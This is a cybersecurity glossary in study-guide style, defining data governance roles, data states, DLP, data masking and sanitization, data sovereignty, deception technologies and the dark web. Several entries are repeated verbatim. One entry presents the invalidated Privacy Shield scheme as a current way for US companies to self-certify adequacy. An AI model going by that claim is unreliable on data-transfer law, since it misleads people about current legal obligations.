8. Restricted Data - This classification refers to sensitive information that requires stringent controls and limited access due to its highly confidential nature. Restricted data typically includes data that, if disclosed or accessed by unauthorized individuals, could cause significant harm to individuals, organizations, or national security.
Data Controller - In privacy regulations, the entity that determines why and how personal data is collected, stored, and used. The controller role closely relates to GDPR and identifies the purposes, conditions, and means of processing personal data. An individual, public authority, agency, or other body can fill the controller role. The controller ensures that data processing activities adhere to all legal requirements. In relation to governance, the controller helps maintain legal and regulatory compliance.
Data Custodian - An individual who is responsible for managing the system on which data assets are stored, including being responsible for enforcing access control, encryption, and backup/recovery measures. The custodian, also known as the data steward, is responsible for the safe custody, transport, storage of the data, and implementation of business rules. The IT department typically represents the custodian role, and in relation to governance, the custodian role implements and enforces the security controls established by the data owner and controller and reports any issues indicative of a security incident.
Data Destruction - An asset disposal technique that ensures that data remnants are rendered physically inaccessible and irrevocable, through degaussing, shredding, or incineration.

It involves the physical or electronic elimination of information stored on media, rendering it inaccessible and irrecoverable. Physical destruction methods include shredding, crushing, or incinerating storage devices, while electronic destruction involves overwriting data multiple times or using degaussing techniques to eliminate magnetic fields on storage media. Destruction is a crucial step in the decommissioning process and ensures that sensitive data cannot be retrieved or misused after the disposal of storage devices.
Data exfiltration - The process by which an attacker takes data that is stored inside of a private network and moves it to an external network. Transfers a copy of some type of valuable information from a computer or network without authorization. A threat actor might perform this type of theft because they want the data asset for themselves, because they can exploit its loss as blackmail or to sell it to a third party.

Data exfiltration refers to obtaining an information asset and copying it to the attacker's remote machine. Anomalous large data transfers might be an indicator for exfiltration, but a threat actor could perform the attack stealthily, by only moving small amounts of data at any one time.
Data Exposure - A software vulnerability where an attacker is able to circumvent access controls and retrieve confidential or sensitive data from the file system or database.

Data exposure is a fault that allows privileged information (such as a token, password, or personal data) to be read without being subject to the appropriate access controls. Applications must only transmit such data between authenticated hosts, using cryptography to protect the session. When incorporating encryption in code, it is important to use industry standard encryption libraries that are proven to be strong, rather than internally developed ones.
Data Governance Roles - Security governance relies heavily on specially designed and interdependent roles called owner, controller, processor, and custodian. Each role carries unique responsibilities that contribute to maintaining effective security oversight and control.

Owner - A senior (executive) role with ultimate responsibility for maintaining the confidentiality, integrity, and availability of an information asset. A high-ranking employee, like a director or a vice president, typically holds the owner role and is ultimately responsible for ensuring data is appropriately protected. The owner identifies what level of classification and sensitivity the data has, decides who should have access to it, and what level of security should be applied. In relation to governance, the owner provides strategic guidance to ensure that security policies align with business objectives.

Controller - In privacy regulations, the entity that determines why and how personal data is collected, stored, and used. The controller role closely relates to GDPR and identifies the purposes, conditions, and means of processing personal data. An individual, public authority, agency, or other body can fill the controller role. The controller ensures that data processing activities adhere to all legal requirements. In relation to governance, the controller helps maintain legal and regulatory compliance.

Processor - In privacy regulations, an entity trusted with a copy of personal data to perform storage and/or analysis on behalf of the data collector. The processor is responsible for processing personal data on behalf of the controller and often represents cloud service providers (CSP) but could also be represented by vendors and business partners. Processors must maintain records of their processing activities, cooperate with supervisory authorities, and implement appropriate security measures to protect the data they handle. In relation to governance, the processor role ensures that data is handled securely and in accordance with the rules established by the owner and controller roles.

Custodian - An individual who is responsible for managing the system on which data assets are stored, including being responsible for enforcing access control, encryption, and backup/recovery measures. The custodian, also known as the data steward, is responsible for the safe custody, transport, storage of the data, and implementation of business rules. The IT department typically represents the custodian role, and in relation to governance, the custodian role implements and enforces the security controls established by the data owner and controller and reports any issues indicative of a security incident.

Coordination among data owner, controller, processor, and custodian in managing and protecting data is crucial to ensure compliance with data protection regulations, establish clear responsibilities, and maintain data integrity and security.
Data Historian - Software that aggregates and catalogs data from multiple sources within an industrial control system.
Data in Transit / Motion - Information that is being transmitted between two hosts, such as over a private network or the Internet.

This is the state when data is transmitted over a network. Examples of types of data that may be in transit include website traffic, remote access traffic, data being synchronized between cloud repositories, and more. In this state, data can be protected by a transport encryption protocol, such as TLS or IPSec.

With data at rest, there is a greater encryption challenge than with data in transit as the encryption keys must be kept secure for longer. Transport encryption can use ephemeral (session) keys.
Data in Use / Processing - Information that is present in the volatile memory of a host, such as system memory or cache.

This is the state when data is present in volatile memory, such as system RAM or CPU registers and cache. Examples of types of data that may be in use include documents open in a word processing application, database data that is currently being modified, event logs being generated while an operating system is running, and more. When a user works with data, that data usually needs to be decrypted as it goes from at rest to in use. The data may stay decrypted for an entire work session, which puts it at risk. However, trusted execution environment (TEE) mechanisms, such as Intel Software Guard Extensions, are able to encrypt data as it exists in memory, so that an untrusted process cannot decode the information.
Data Inventories - List of classified data or information stored or processed by a system.

Privacy laws profoundly impact data inventories and data retention practices within organizations. These laws, such as the GDPR and CCPA, require organizations to maintain a detailed record of the personal data they collect, process, and store. Data inventories×
List of classified data or information stored or processed by a system.

 provide a comprehensive overview of the types of data being handled, the purposes for processing, the legal basis, and recipients of the data to ensure transparency and accountability, as organizations can clearly understand and document their data processing activities in compliance with privacy laws. Privacy laws stipulate that organizations must have a lawful basis for processing personal data. Data inventories are crucial in identifying the legal grounds for data processing. By documenting the legal basis for each category of personal data, organizations can ensure that their processing activities align with the specified lawful purposes outlined in privacy laws. Organizations must collect and process only the necessary elements of personal data for specific and legitimate purposes. Data inventories assist organizations in evaluating the personal data they collect, ensuring they only gather necessary information. By keeping the inventory up to date, organizations can align their practices with the principles of data minimization and purpose limitation.
Data Loss Prevention (DLP) - A software solution that detects and prevents sensitive information from being stored on unauthorized systems or transmitted over unauthorized networks.	

To apply data guardianship policies and procedures, smaller organizations might classify and type data manually. An organization that creates and collects large amounts of personal data will usually need to use automated tools to assist with this task, however. There may also be a requirement to protect valuable intellectual property (IP) data. Data loss prevention (DLP) products automate the discovery and classification of data types and enforce rules so that data is not viewed or transferred without a proper authorization. Such solutions will usually consist of the following components:

1. Policy Server - To configure classification, confidentiality, and privacy rules and policies, log incidents, and compile reports.

2. Endpoint Agents - To enforce policy on client computers, even when they are not connected to the network.

3. Network Agents - To scan communications at network borders and interface with web and messaging servers to enforce policy.

DLP agents scan content in structured formats, such as a database with a formal access control model, or unstructured formats, such as email or word processing documents. Data transformation is applied to unstructured data to render it in a consistent, scannable format for policy enforcement. The transfer of content to removable media, such as USB devices, or by email, instant messaging, or even social media, can then be blocked if it does not conform to a predefined policy. Most DLP solutions can extend the protection mechanisms to cloud storage services, using either a proxy to mediate access or the cloud service provider's API to perform scanning and policy enforcement.

Remediation is the action the DLP software takes when it detects a policy violation. The following remediation mechanisms are typical:

1. Alert only - The copying is allowed, but the management system records an incident and may alert an administrator.

2. Block - The user is prevented from copying the original file but retains access to it. The user may or may not be alerted to the policy violation, but it will be logged as an incident by the management engine.

3. Quarantine - Access to the original file is denied to the user (or possibly any user). This might be accomplished by encrypting the file in place or by moving it to a quarantine area in the file system.

4. Tombstone - The original file is quarantined and replaced with one describing the policy violation and how the user can release it again.

When it is configured to protect a communications channel such as email, DLP remediation might take place using client-side or server-side mechanisms. For example, some DLP solutions prevent the actual attaching of files to the email before it is sent. Others might scan the email attachments and message contents, and then strip out certain data or stop the email from reaching its destination.
Data Masking - A de-identification method where generic or placeholder labels are substituted for real data while preserving the structure or format of the original data.

Data masking can mean that all or part of the contents of a database field are redacted by substituting all character strings with "x", for example. A field might be partially redacted to preserve metadata for analysis purposes. For example, in a telephone number, the dialing prefix might be retained, but the subscriber number is redacted. Data masking can also use techniques to preserve the original format of the field.

Data masking is used for de-identification. De-identification obfuscates personal data from databases so that it can be shared without compromising privacy.
Data Owner - A senior (executive) role with ultimate responsibility for maintaining the confidentiality, integrity, and availability of an information asset. A high-ranking employee, like a director or a vice president, typically holds the owner role and is ultimately responsible for ensuring data is appropriately protected. The owner identifies what level of classification and sensitivity the data has, decides who should have access to it, and what level of security should be applied. In relation to governance, the owner provides strategic guidance to ensure that security policies align with business objectives.
Data Processor - In privacy regulations, an entity trusted with a copy of personal data to perform storage and/or analysis on behalf of the data collector. The processor is responsible for processing personal data on behalf of the controller and often represents cloud service providers (CSP) but could also be represented by vendors and business partners. Processors must maintain records of their processing activities, cooperate with supervisory authorities, and implement appropriate security measures to protect the data they handle. In relation to governance, the processor role ensures that data is handled securely and in accordance with the rules established by the owner and controller roles.
Data Protection - Encryption techniques for protecting data in different states: at rest, in transit, and in use.	

Classifying data as "at rest," "in motion," and "in use" is crucial for effective data protection and security measures. By analyzing data based on its state (at rest, in motion, in use), organizations can tailor security measures and controls to address the specific risks and requirements associated with each data state. This classification helps organizations identify vulnerabilities, prioritize security investments, and ensure appropriate safeguards to protect sensitive data throughout its lifecycle. It also facilitates compliance with data protection regulations and industry best practices.

1. Data at Rest - This state means that the data is in some sort of persistent storage media. Examples of types of data that may be at rest include financial information stored in databases, archived audiovisual media, operational policies and other management documents, system configuration data, and more. In this state, it is usually possible to encrypt the data, using techniques such as whole disk encryption, database encryption (Applying encryption at the table, field, or record level via a database management system rather than via the file system), and file- or folder-level encryption. It is also possible to apply permissions—access control lists (ACLs)—to ensure only authorized users can read or modify the data. ACLs can be applied only if access to the data is fully mediated through a trusted OS.

2. Data in Transit (or data in motion) - This is the state when data is transmitted over a network. Examples of types of data that may be in transit include website traffic, remote access traffic, data being synchronized between cloud repositories, and more. In this state, data can be protected by a transport encryption protocol, such as TLS or IPSec.

With data at rest, there is a greater encryption challenge than with data in transit as the encryption keys must be kept secure for longer. Transport encryption can use ephemeral (session) keys.

3. Data in Use (or Data in Processing) - This is the state when data is present in volatile memory, such as system RAM or CPU registers and cache. Examples of types of data that may be in use include documents open in a word processing application, database data that is currently being modified, event logs being generated while an operating system is running, and more. When a user works with data, that data usually needs to be decrypted as it goes from at rest to in use. The data may stay decrypted for an entire work session, which puts it at risk. However, trusted execution environment (TEE) mechanisms, such as Intel Software Guard Extensions, are able to encrypt data as it exists in memory, so that an untrusted process cannot decode the information.

Data Protection Methods

1. Geographic Restrictions - Geographic restrictions involve limiting access to data based on specific geographic locations. It ensures that data is accessible only from approved regions, providing additional control and security. A common use case for geographic restrictions involves cloud computing and data storage services. When organizations utilize cloud platforms or third-party datacenters to store their data, they may need to enforce geographic restrictions to specify where their data can be stored and processed to comply with data protection laws and regulations.

2. Encryption - Encryption converts data into a coded format that can only be accessed or deciphered with an encryption key or password. It protects data confidentiality and ensures that even if data is intercepted, it remains unreadable to unauthorized parties.

3. Hashing - Hashing involves converting data into a fixed-length string of characters using a hashing algorithm. Hashing is commonly used to verify data integrity and securely store passwords.

4. Masking - Masking involves replacing sensitive data with fictional or partially concealed values while preserving the format and length of the original data. It prevents exposing sensitive information and is often used to hide sensitive data fields and password characters entered into forms.

5. Tokenization - Tokenization replaces sensitive data with a randomly generated token while securely storing the original data in a separate location. Tokens have no meaningful value, reducing the risk of unauthorized access or exposure of sensitive information. A common use case for data tokenization is in payment processing systems. When customers make a payment, their sensitive payment card information, such as credit card numbers, is replaced with a randomly generated token. This token is then used to represent the payment card data during transactions and is stored in the system's database.

6. Obfuscation - Obfuscation involves modifying data to make it difficult to understand or reverse engineer without altering functionality. Software development commonly uses obfuscation techniques to protect source code intellectual property and prevent unauthorized access to critical details. Examples of obfuscation include data masking, data type conversion, and hashing.

7. Segmentation - Segmentation is a method of securing data by dividing networks, data, and applications into isolated components to improve sensitive data protection, limit the impact of a breach, and improve network security. Segmentation helps restrict access based on user roles, privileges, location, or other criteria. It helps limit exposure by granting access only to the specific data segments required for authorized users or processes. A common use case for data segmentation is in healthcare systems or electronic health records (EHRs). Patient data is often categorized and segmented in these systems based on various factors, such as medical conditions, departments, or access levels. Data segmentation allows healthcare professionals to control and limit access to sensitive patient information based on the principle of least privilege. Different healthcare providers, specialists, or departments may have access only to the specific patient data relevant to their roles or treatment responsibilities.

8. Permission Restrictions - Permission restrictions involve controlling access to data based on user permissions. It ensures that only authorized individuals or roles can view, modify, or interact with specific data elements, reducing the risk of unauthorized access, data breaches, or accidental misuse. Access Control Lists, Role-Based Access Control, Rule-based Access Control, Mandatory Access Control, Attribute-Based Access Control, and other methods enforce the principle of least privilege.
Data Protection Methods - 1. Geographic Restrictions - Geographic restrictions involve limiting access to data based on specific geographic locations. It ensures that data is accessible only from approved regions, providing additional control and security. A common use case for geographic restrictions involves cloud computing and data storage services. When organizations utilize cloud platforms or third-party datacenters to store their data, they may need to enforce geographic restrictions to specify where their data can be stored and processed to comply with data protection laws and regulations.

2. Encryption - Encryption converts data into a coded format that can only be accessed or deciphered with an encryption key or password. It protects data confidentiality and ensures that even if data is intercepted, it remains unreadable to unauthorized parties.

3. Hashing - Hashing involves converting data into a fixed-length string of characters using a hashing algorithm. Hashing is commonly used to verify data integrity and securely store passwords.

4. Masking - Masking involves replacing sensitive data with fictional or partially concealed values while preserving the format and length of the original data. It prevents exposing sensitive information and is often used to hide sensitive data fields and password characters entered into forms.

5. Tokenization - Tokenization replaces sensitive data with a randomly generated token while securely storing the original data in a separate location. Tokens have no meaningful value, reducing the risk of unauthorized access or exposure of sensitive information. A common use case for data tokenization is in payment processing systems. When customers make a payment, their sensitive payment card information, such as credit card numbers, is replaced with a randomly generated token. This token is then used to represent the payment card data during transactions and is stored in the system's database.

6. Obfuscation - Obfuscation involves modifying data to make it difficult to understand or reverse engineer without altering functionality. Software development commonly uses obfuscation techniques to protect source code intellectual property and prevent unauthorized access to critical details. Examples of obfuscation include data masking, data type conversion, and hashing.

7. Segmentation - Segmentation is a method of securing data by dividing networks, data, and applications into isolated components to improve sensitive data protection, limit the impact of a breach, and improve network security. Segmentation helps restrict access based on user roles, privileges, location, or other criteria. It helps limit exposure by granting access only to the specific data segments required for authorized users or processes. A common use case for data segmentation is in healthcare systems or electronic health records (EHRs). Patient data is often categorized and segmented in these systems based on various factors, such as medical conditions, departments, or access levels. Data segmentation allows healthcare professionals to control and limit access to sensitive patient information based on the principle of least privilege. Different healthcare providers, specialists, or departments may have access only to the specific patient data relevant to their roles or treatment responsibilities.

8. Permission Restrictions - Permission restrictions involve controlling access to data based on user permissions. It ensures that only authorized individuals or roles can view, modify, or interact with specific data elements, reducing the risk of unauthorized access, data breaches, or accidental misuse. Access Control Lists, Role-Based Access Control, Rule-based Access Control, Mandatory Access Control, Attribute-Based Access Control, and other methods enforce the principle of least privilege.
Data Replication (Cloud) - Data replication allows businesses to copy data to where it can be utilized most effectively. The cloud may be used as a central storage area, making data available among all business units. Data replication requires low latency network connections, security, and data integrity. CSPs offer several data storage performance tiers. The terms "hot storage" and "cold storage" refer to how quickly data is retrieved. Hot storage retrieves data more quickly than cold, but the quicker the data retrieval, the higher the cost.

Different applications have diverse replication requirements. A database generally needs low-latency, synchronous replication, as a transaction often cannot be considered complete until it has been made on all replicas. A mechanism to replicate data files to backup storage might not have such high requirements, depending on the criticality of the data.
Data Retention - The process an organization uses to maintain the existence of and control over certain data in order to comply with business policies and/or applicable laws and regulations.

Data retention is another area impacted by privacy laws. Organizations must retain personal data only for as long as necessary to fulfill the intended purpose or as required by law. Data inventories help organizations determine appropriate retention periods for different categories of personal data, ensuring compliance with data storage limitation requirements. Keeping accurate records in the data inventory enables organizations to securely delete or anonymize data when it is no longer needed. Privacy laws grant individuals various rights, such as the right to access their personal data. Data inventories are instrumental in facilitating the exercise of these rights. By maintaining comprehensive inventories, organizations can promptly respond to data subject requests, provide individuals with access to their data, rectify inaccuracies, and fulfill requests for erasure in accordance with privacy laws.
Data Sanitization - The process of thoroughly and completely removing data from a storage medium so that file remnants cannot be recovered. It refers to the process of removing sensitive information from storage media to prevent unauthorized access or data breaches. This process uses specialized techniques, such as data wiping, degaussing, or encryption, to ensure that the data becomes irretrievable. Sanitization is particularly important when repurposing or donating storage devices, as it helps protect the organization's sensitive information and maintains compliance with data protection regulations.
Data Sanitization / Destruction Certification - An asset disposal technique that relies on a third party to use sanitization or destruction methods for data remnant removal, and provides documentary evidence that the process is complete and successful.

It refers to the documentation and verification of the data sanitization or destruction process. This often involves obtaining a certificate of destruction or sanitization from a reputable third-party provider, attesting that the data has been securely removed or destroyed in accordance with industry standards and regulations. Certification helps organizations maintain compliance with data protection requirements, provides evidence of due diligence, and reduces the risk of legal liabilities. Certifying data destruction without third-party involvement can be challenging, as the latter provides an impartial evaluation.
Data Sources, Dashboards, and Reports - In the context of an incident response case or digital forensics investigation, a data source is something that can be subjected to analysis to discover indicators. These investigations use diverse data sources:

1. System memory and media device file system data and metadata.

2. Log files generated by network appliances (switches, routers, and firewalls/UTMs).

3. Network traffic captured by sensors and/or any alertable or loggable conditions raised by intrusion detection systems.

4. Log files and alerts generated by network-based vulnerability scanners.

5. Log files generated by the OS components of client and server host computers.

6. Log files generated by applications and services running on hosts.

7. Log files and alerts generated by endpoint security software installed on hosts. 

8. This can include host-based intrusion detection, vulnerability scanning, antivirus, and firewall security software.

The sheer diversity and size of data sources is a significant problem for investigations. Organizations use security information and event management (SIEM) tools to aggregate and correlate multiple data sources. This can be used as a single source for agent dashboards and automated reports.

Issues posed by dealing with large amounts of data are often described as the "Vs." They include volume, velocity, variety, veracity, and value.

Dashboards
An event dashboard (A console presenting selected information in an easily digestible format, such as a visualization) provides a console to work from for day-to-day incident response. It provides a summary of information drawn from the underlying data sources to support some work task. Separate dashboards can be created to suit many different purposes. An incident handler's dashboard will contain uncategorized events that have been assigned to their account, plus visualizations (A widget showing records or metrics in a visual format, such as a graph or table) showing key status metrics. A manager's dashboard would show overall status indicators, such as number of unclassified events for all event handlers.

Automated Reports
A SIEM can be used for two types of reporting:

1. Alerts and alarms detect the presence of threat indicators in the data and can be used to start incident cases. Day-to-day management of alert reporting forms a large part of an analyst's workload.

2. Status reports communicate data about the level of threat or number of incidents being raised and the effectiveness of security controls and response procedures. This type of reporting can be used to inform management decisions. It might also be required for compliance reporting.

A SIEM will ship with a number of preconfigured dashboards and reports, but it will also make tools available for creating custom reports. It is critical to tailor the information presented in a dashboard or report to meet the needs and goals of its intended audience. If the report simply contains an overwhelming amount of information or irrelevant information, it will not be possible to quickly identify remediation actions.
Data Sovereignty - In data protection, the principle that countries and states may impose individual requirements on data collected or stored within their jurisdiction.

Data sovereignty refers to a jurisdiction preventing or restricting processing and storage from taking place on systems that do not physically reside within that jurisdiction. Data sovereignty may demand certain concessions on your part, such as using location-specific storage facilities in a cloud service.

For example, GDPR protections are extended to any EU citizen while they are within EU or EEA (European Economic Area) borders. Data subjects can consent to allow a transfer but there must be a meaningful option for them to refuse consent. If the transfer destination jurisdiction does not provide adequate privacy regulations (to a level comparable to GDPR), then contractual safeguards must be given to extend GDPR rights to the data subject. In the United States, companies can self-certify that the protections they offer are adequate under the Privacy Shield scheme.

Maintaining compliance with data sovereignty requirements requires several approaches. Organizations ensure data localization by storing and processing data using datacenters or cloud providers within defined legal or geographic boundaries. Additionally, contractual agreements with vendors and service providers ensure data remains within approved boundaries by outlining responsibilities, restrictions, and mandatory safeguards.
Data Sovereignty and Geographical Considerations - Some states and nations may respect data privacy more or less than others; and likewise, some nations may disapprove of the nature and content of certain data. They may even be suspicious of security measures such as encryption. When your data is stored or transmitted in other jurisdictions, or when you collect data from citizens in other states or other countries, you may not "own" the data in the same way as you'd expect or like to.

Data Sovereignty
In data protection, the principle that countries and states may impose individual requirements on data collected or stored within their jurisdiction.

Data sovereignty refers to a jurisdiction preventing or restricting processing and storage from taking place on systems that do not physically reside within that jurisdiction. Data sovereignty may demand certain concessions on your part, such as using location-specific storage facilities in a cloud service.

For example, GDPR protections are extended to any EU citizen while they are within EU or EEA (European Economic Area) borders. Data subjects can consent to allow a transfer but there must be a meaningful option for them to refuse consent. If the transfer destination jurisdiction does not provide adequate privacy regulations (to a level comparable to GDPR), then contractual safeguards must be given to extend GDPR rights to the data subject. In the United States, companies can self-certify that the protections they offer are adequate under the Privacy Shield scheme.

Maintaining compliance with data sovereignty requirements requires several approaches. Organizations ensure data localization by storing and processing data using datacenters or cloud providers within defined legal or geographic boundaries. Additionally, contractual agreements with vendors and service providers ensure data remains within approved boundaries by outlining responsibilities, restrictions, and mandatory safeguards.

Geographical Considerations
Geographic access requirements fall into two different scenarios:

1. Storage locations might have to be carefully selected to mitigate data sovereignty issues. Most cloud providers allow a choice of datacenters for processing and storage, ensuring that information is not illegally transferred from a particular privacy jurisdiction without consent.

2. Employees needing access from multiple geographic locations. Cloud-based file and database services can apply constraint-based access controls to validate the user's geographic location before authorizing access.

Geographic restrictions impact other business functions:

1. Geolocation requirements impact data protection practices by requiring organizations to ensure data remains within a designated boundary, such as utilizing local datacenters or cloud providers. Geolocation restrictions affect data protection practices such as data replication and data dispersion.

2. Geolocation requirements impact incident investigation and forensics activities because they often include jurisdiction-specific data access and sharing restrictions, and other legal requirements.
Data Subject - An individual that is identified by privacy data.

Confidential data typically does not grant specific rights to the data subjects, as it relates more to organizations' proprietary information. The handling of privacy data often requires explicit consent from the data subject for its collection, use, and disclosure, particularly in compliance with privacy laws and regulations. On the other hand, confidential data, while protected, may not necessarily require individual consent for its handling, as it is associated with internal or business-related information.

Privacy and confidential data share similarities in sensitivity and legal considerations. However, scope, focus, data subject rights, and consent requirements differ. While both types of data require careful handling and protection, privacy data pertains explicitly to personal information and individual privacy rights.
Data Types - The concept of data types refers to categorizing or classifying data based on its inherent characteristics, structure, and intended use. Data types provide a way to organize and understand the different data forms within a system or dataset. Classifying data into specific types makes analyzing, processing, interpreting, and securing information easier.

Regulated Data
Information that has storage and handling compliance requirements defined by national and state legislation and/or industry regulations.

Regulated data refers to specific categories of information subject to legal or regulatory requirements regarding their handling, storage, and protection. Regulated data typically includes sensitive or personally identifiable information (PII) protected by laws and regulations to ensure privacy, security, and appropriate use. The types of regulated data vary depending on jurisdiction and the specific regulations applicable to the organization or data. Common examples of regulated data include financial information, healthcare records, social security numbers, credit card details, and other personally identifiable information. Privacy laws and industry-specific regulations often protect these data types, such as the Health Insurance Portability and Accountability Act (HIPAA) for healthcare data or the Payment Card Industry Data Security Standard (PCI DSS) for credit card information. Organizations that handle regulated data must comply with relevant laws and regulations governing its protection. Compliance typically involves implementing appropriate security measures, data encryption, access controls, data breach notification procedures, and data handling protocols. Organizations may also need to establish data storage, retention, and destruction safeguards to meet regulatory requirements.

Trade Secrets
Intellectual property that gives a company a competitive advantage but hasn't been registered with a copyright, trademark, or patent.

Trade secret data refers to valuable, confidential information that gives a business a competitive advantage. Trade secrets encompass much nonpublic, proprietary information, including formulas, processes, methods, techniques, customer lists, pricing information, marketing strategies, and other business-critical data. Trade secrets have commercial value derived from their secrecy. Businesses often require employees and contractors to sign non-disclosure agreements (NDAs) to safeguard the confidentiality of trade secrets. Disclosure or unauthorized use of trade secret data is a serious legal matter. Companies can take legal action against individuals or organizations unlawfully acquiring, using, or disclosing trade secrets. Laws related to trade secrets vary across jurisdictions, but they generally aim to prevent unfair competition and provide remedies for misappropriation.

Legal Data
Documents and records that relate to matters of law, such as contracts, property, court cases, and regulatory filings.

Legal and financial data encompass critical data for legal compliance, financial reporting, decision-making, and risk management. Legal data includes documents, contracts, legal agreements, court records, litigation information, intellectual property filings, regulatory filings, and other legal documents. It may also encompass information related to corporate governance, compliance with laws and regulations, and legal obligations specific to an industry or jurisdiction.

Financial Data
Data held about bank and investment accounts, plus information such as payroll and tax returns.

Financial data pertains to information concerning an organization's financial activities, performance, and transactions, including financial statements, balance sheets, income statements, cash flow statements, audit reports, tax records, financial projections, budgets, and other financial reports. Financial data also encompasses details of financial transactions, such as accounts payable, accounts receivable, general ledger entries, and transactional records. Legal and financial data are highly sensitive and confidential due to their nature and the potential impact they can have on an organization's reputation, legal standing, and financial stability.

Human-Readable Data
Information stored in a file type that human beings can access and understand using basic viewer software, such as documents, images, video, and audio.

Human-readable data refers to information that humans can easily understand and interpret without additional processing or translation. Human-readable data describes a format that is accessible and readable, such as text, images, or multimedia content. Examples of human-readable data include documents, reports, emails, web pages, and presentations. 

Non-Human-Readable Data
Information stored in a file that human beings cannot read without a specialized processor to decode the binary or complex structure.

Non-human-readable data refers to data that is not easily understood or interpreted by humans in its raw form. It may be in a machine-readable format, such as binary code, encrypted data, or data represented in a complex structure or encoding that requires specialized software or algorithms to decipher and interpret. Non-human-readable data often requires additional processing or transformation to make it understandable to humans.

Human-readable and non-human-readable data formats have distinct implications for security operations and controls. Human-readable and non-human-readable data formats impact security operations and controls in different ways. Security monitoring, user awareness, DLP, content filtering, and web security are more directly applicable to human-readable data formats.

On the other hand, encryption, access controls, intrusion detection and prevention, secure data exchange, and code/application security are more relevant to non-human-readable data formats. It is important to note that non-human-readable data formats can impede the capabilities of security controls because non-human-readable data formats cannot be easily interpreted using traditional methods and require specialized approaches to inspect and protect them. A comprehensive security approach considers both types of data formats and implements appropriate measures to protect them based on their characteristics and associated risks.
Database Encryption - Applying encryption at the table, field, or record level via a database management system rather than via the file system.
dd command - Linux command that makes a bit-by-bit copy of an input file, typically used for disk imaging.
Decentralized Computing Architecture - A model in which data processing and storage are distributed across multiple locations or devices.

Decentralized computing architecture is a model in which data processing and storage are distributed across multiple locations or devices. No single device or location is responsible for all data processing and storage. Decentralized computing architectures are an increasingly important design trend impacting modern infrastructures.

The choice between centralized and decentralized architecture depends on an organization's specific needs and goals. Centralized architecture is often used in large organizations with a need for strict control and management. In contrast, decentralized architecture is used in situations where resilience and flexibility are more important than central control.

Decentralized architecture is becoming increasingly popular as it offers several benefits, such as improved fault tolerance, scalability, and unique security features. Some noteworthy examples of decentralized architecture include the following:

1. Blockchain is a distributed ledger technology that allows for secure, transparent, and decentralized transactions.

2. Peer-to-peer (P2P) networks are networks designed to distribute processing and data storage among participating nodes instead of relying on a central server.

3. Content delivery networks (CDNs) distribute content across multiple servers to improve performance, reliability, and scalability.

4. Internet of Things (IoT) devices can be connected in a decentralized network to share data and processing power.

5. Distributed databases distribute data across multiple servers, ensuring that data is always available, even if one server goes down.

6. Tor (The Onion Router) is a network that enables anonymous communication and browsing. Tor routes traffic through a network of volunteer-operated servers, or nodes, to hide a user's location and internet activity.
Deception Technologies - Cybersecurity resilience tools and techniques to increase the cost of attack planning for the threat actor.

Deception and disruption technologies are cybersecurity resilience tools and techniques to increase the cost of attack planning for the threat actor. Honeypots (A host (honeypot), network (honeynet), file (honeyfile), or credential/token (honeytoken) set up with the purpose of luring attackers away from assets of actual value and/or discovering attack strategies and weaknesses in the security configuration), Honeynets, Honeyfiles, and Honeytokens are all cybersecurity tools used to detect and defend against attacks. Honeypots are decoy systems that mimic real systems and applications. They are designed to allow security teams to monitor attacker activity and gather information about their tactics and tools. Honeynets are a network of interconnected honeypots that simulate an entire network, providing a more extensive and realistic environment for attackers to engage with. Honeyfiles are fake files that appear to contain sensitive information, used to detect attempts to access and steal data. Honeytokens are false credentials, login credentials, or other data types used to distract attackers, trigger alerts, and provide insight into attacker activity.

By deploying these tools, organizations can detect and monitor attacks, gather intelligence about attackers and their methods, and proactively defend against future attacks. These tools can also provide an additional layer of defense by diverting attackers' attention away from real systems and applications, reducing the risk of successful attacks.

Disruption Strategies
Another type of active defense uses disruption strategies. These adopt some of the obfuscation strategies used by malicious actors. The aim is to raise the attack cost and tie up the adversary's resources. Some examples of disruption strategies include the following:

1. Using bogus DNS entries to list multiple hosts that do not exist.

2. Configuring a web server with multiple decoy directories or dynamically generated pages to slow down scanning.

3. Using port triggering or spoofing to return fake telemetry (Deception strategy that returns spoofed data in response to network probes) data when a host detects port scanning activity. This will result in multiple ports being falsely reported as open and slow down the scan. Telemetry can refer to any type of measurement or data returned by remote scanning. Similar fake telemetry could be used to report IP addresses as up when they are not, for instance.

4. Using a DNS sinkhole (A temporary DNS record that redirects malicious traffic to a controlled IP address) to route suspect traffic to a different network, such as a honeynet, where it can be analyzed.
Deep and Dark Web - Threat research is a counterintelligence gathering effort in which security companies and researchers attempt to discover the tactics, techniques, and procedures (TTPs - Analysis of historical cyberattacks and adversary actions) of modern cyber adversaries. There are many companies and academic institutions engaged in primary cybersecurity research. Security solution providers with firewall and antimalware platforms derive a lot of data from their own customers' networks. As they assist customers with cybersecurity operations, they are able to analyze and publicize TTPs and their indicators. These organizations also operate honeynets to try to observe how hackers interact with vulnerable systems.

The deep web and dark web are also sources of threat intelligence. The deep web is any part of the World Wide Web that is not indexed by a search engine. This includes pages that require registration, pages that block search indexing, unlinked pages, pages using nonstandard DNS, and content encoded in a nonstandard manner. Within the deep web are areas that are deliberately concealed from "regular" browser access.

1. Dark Net - Is a network established as an overlay to Internet infrastructure by software, such as The Onion Router (TOR), Freenet, or I2P, that acts to anonymize usage and prevent a third party from knowing about the existence of the network or analyzing any activity taking place over the network. Onion routing, for instance, uses multiple layers of encryption and relays between nodes to achieve this anonymity.

2. Dark Web - Is sites, content, and services accessible only over a dark net. While there are dark web search engines, many sites are hidden from them. Access to a dark web site via its URL is often only available via "word of mouth" bulletin boards.

Investigating these dark web sites and message boards is a valuable source of counterintelligence. The anonymity of dark web services has made it easy for investigators to infiltrate the forums and web stores that have been set up to exchange stolen data and hacking tools. As adversaries react to this, they are setting up new networks and ways of identifying law enforcement infiltration. Consequently, dark nets and the dark web represent a continually shifting landscape.

The dark web is generally associated with illicit activities and illegal content, but it also has legitimate purposes.

1. Privacy and Anonymity - The dark web provides a platform for enhanced privacy and anonymity. It allows users to communicate and browse the Internet without revealing their identity or location, which can be valuable for whistleblowers, journalists, activists, or individuals living under repressive government regimes.

2. Access to Censored Information - In countries with strict Internet censorship, the dark web can be an avenue for accessing information that is otherwise blocked or restricted. It enables individuals to bypass censorship and access politically sensitive or controversial content.

3. Research and Information Sharing - Some academic researchers or cybersecurity professionals may explore the dark web to gain insights into criminal activities and analyze emerging threats to improve cybersecurity operations.
Deep Web - The deep web is any part of the World Wide Web that is not indexed by a search engine. This includes pages that require registration, pages that block search indexing, unlinked pages, pages using nonstandard DNS, and content encoded in a nonstandard manner. Within the deep web are areas that are deliberately concealed from "regular" browser access.
